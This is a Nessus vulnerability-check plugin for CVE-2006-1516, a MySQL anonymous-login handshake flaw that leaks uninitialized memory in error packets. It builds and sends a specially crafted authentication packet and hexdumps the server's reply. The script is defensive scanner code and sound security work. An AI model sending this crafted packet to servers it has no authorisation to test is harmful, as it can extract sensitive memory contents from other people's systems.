#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote database server is affected by an information disclosure
flaw. 

Description :

The MySQL database server on the remote host reads from uninitialized
memory when processing a specially-crafted login packet.  An
unauthenticated attacker may be able to exploit this flaw to obtain
sensitive information from the affected host as returned in an error
packet. 

See also :

http://www.securityfocus.com/archive/1/432733/30/0/threaded
http://dev.mysql.com/doc/refman/4.1/en/news-4-0-27.html
http://dev.mysql.com/doc/refman/4.1/en/news-4-1-19.html
http://dev.mysql.com/doc/refman/5.0/en/news-5-0-21.html
http://dev.mysql.com/doc/refman/5.1/en/news-5-1-10.html

Solution :

Upgrade to MySQL 4.0.27 / 4.1.19 / 5.0.21 / 5.1.10 or later.

Risk factor :

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";


if (description)
{
  script_id(21632);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-1516");
  script_bugtraq_id(17780);

  script_name(english:"MySQL Anonymous Login Handshake Information Leakage Vulnerability");
  script_summary(english:"Checks for anonymous login handshake info leakage in MySQL");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"Databases");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service.nes");
  script_require_ports("Services/mysql", 3306);

  exit(0);
}


include("dump.inc");
include("global_settings.inc");
include("mysql_func.inc");


port = get_kb_item("Services/mysql");
if (!port) port = 3306;
if (!get_port_state(port)) exit(0);


# Establish a connection.
#
# nb: this requires that the nessusd host be allowed to connect.
soc = open_sock_tcp(port);
if (!soc) return NULL;
if (mysql_open(soc:soc) == 1)
{
  # Send a malicious client authentication packet.
  cap = mkdword(mysql_get_caps() | 1 | 8 | 512) +  # client capabilities
                                                   #   1 => long password
                                                   #   8 => specify db on connect
                                                   #   512 => 4.1 protocol
    mkdword(65535) +                               # max packet size
    mkbyte(mysql_get_lang()) +                     # charset
    crap(data:raw_string(0), length:23) +          # filler
    "nessus" +                                     # username minus null byte
    mkbyte(20) + crap(20) +                        # scramble (len + data)
    SCRIPT_NAME + crap(20) + mkbyte(0);            # database plus null byte
  mysql_send_packet(data:cap);
  pkt = mysql_recv_packet();
  if (!isnull(pkt))
  {
    err = mysql_parse_error_packet(packet:pkt);
    # nb: a non-affected version will report "Bad handshake".
    if (
      !isnull(err) && 
      (
        "Access denied" >< err["msg"] || 
        "Incorrect database name" >< err["msg"]
      )
    )
    {
      if (report_verbosity > 1)
      {
        msg = hexdump(ddata:err["msg"]);
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Here is the text returned by the affected MySQL server :\n",
          "\n",
          msg, "\n"
        );
      }
      else
        report = desc;
      security_note(port:port, data:report);
    }
  }
}
mysql_close();
